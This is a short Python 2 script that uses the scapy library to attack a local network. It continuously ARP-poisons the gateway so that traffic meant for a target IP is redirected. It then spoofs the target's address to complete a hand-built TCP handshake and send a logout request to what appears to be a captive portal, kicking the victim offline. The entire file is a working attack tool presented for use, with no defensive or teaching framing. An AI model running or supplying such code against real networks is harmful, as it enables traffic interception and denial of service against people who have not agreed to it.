# Change log level to suppress annoying IPv6 error
import logging 
# Import scapy
from scapy.all import *
import threading
import os
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
VIP = raw_input('Please enter the IP address of the target computer: ')
GW = raw_input('Please enter th IP address of the gateway: ')
IFACE = raw_input('Please enter the name of your interface: ')
print '\nMake sure you are running as root!, and enjoy. '
 

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') 

def gw_poison():
        gw = ARP(pdst=GW, psrc=VIP)
        while True:
                try:
                       send(gw,verbose=0,inter=1,loop=1)
                except KeyboardInterupt:
                        sys.exit(1)


def log_out(gateway):
  get='GET /logout?0f030f0d0b1d5755 HTTP/1.1\r\nHost: 172.16.24.1:1000\r\naccept-encoding: gzip, deflate\r\n\r\n'
  ip=IP(dst=gateway,src=VIP)# Set up target IP
  port=RandNum(1024,65535)  # Generate random source port number
  SYN=ip/TCP(sport=port, dport=1000, flags="S", seq=41)
  print "\n[*] Sending SYN packet"
  SYNACK=sr1(SYN)
  print "ack num" , SYNACK.ack
  ACK=ip/TCP(sport=SYNACK.dport, dport=1000, flags="A", seq=SYNACK.ack, ack=SYNACK.seq + 1) / get
  print "\n[*] Sending ACK-GET packet"
  reply,error=sr(ACK)
  print "\n[*] Reply from server:"
  print reply.show()
  print '\n[*] Done!'
gwthread = []  
gwpoison = threading.Thread(target=gw_poison)
gwpoison.setDaemon(True)
gwthread.append(gwpoison)
gwpoison.start()
print 'logging out'
log_out(GW)





